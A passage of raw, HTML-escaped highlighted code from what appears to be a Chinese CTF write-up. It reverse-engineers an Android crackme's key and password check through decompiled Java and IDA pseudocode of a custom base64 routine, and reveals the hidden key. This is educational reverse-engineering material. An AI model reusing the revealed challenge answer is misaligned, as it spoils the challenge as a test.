&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;findViewById&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F080057&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; View$OnClickListener&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;findViewById&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F0800B7&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;findViewById&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F0800F2&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// btn, key, password
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;View arg4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;val$key&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                    System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;val$key&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
                    Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key错误！&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;val$passwd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;val$key&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                    Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;明文正确，快去解压缩包获取flag吧！&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                    Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;明文错误！&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;native&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String arg1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码是读入 &lt;code&gt;key&lt;/code&gt; 和 &lt;code&gt;password&lt;/code&gt;，然后先判断 &lt;code&gt;key&lt;/code&gt; 是否正确，如果正确的话判断 &lt;code&gt;password&lt;/code&gt; 是否正确&lt;/p&gt;
&lt;p&gt;那么肯定先破解 &lt;code&gt;key&lt;/code&gt;，发现 &lt;code&gt;verify&lt;/code&gt; 是外部函数&lt;/p&gt;
&lt;p&gt;找到 &lt;code&gt;native-lib.so&lt;/code&gt; 文件，拖入ida，找到函数名里搜索 &lt;code&gt;java&lt;/code&gt; 或 &lt;code&gt;verify&lt;/code&gt; 之类的，找到这个判断函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;, _QWORD))(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1352LL&lt;/span&gt;))(a1, a3, &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;);
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;))(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1344LL&lt;/span&gt;))(a1, v3);
  memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E8uLL&lt;/span&gt;);
  sub_710(v4, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, v5 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;UUUV&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;UUUV&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)));
  sub_820(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22);                   &lt;span style=&#34;color:#75715e&#34;&gt;// s=&amp;#39;th1s_1s_k3ya!!!!&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_10;
  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )                                   &lt;span style=&#34;color:#75715e&#34;&gt;// base64
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  {
    v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; )
    {
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6)];&lt;span style=&#34;color:#75715e&#34;&gt;// abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)];
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)];
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)];
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_4;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; )
    {
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6)];
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)];
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)];
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_10;
    }
LABEL_4:
    v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __OFADD__(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, v5);
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v9 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v10) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; v8 )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_10;
  }
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6)];
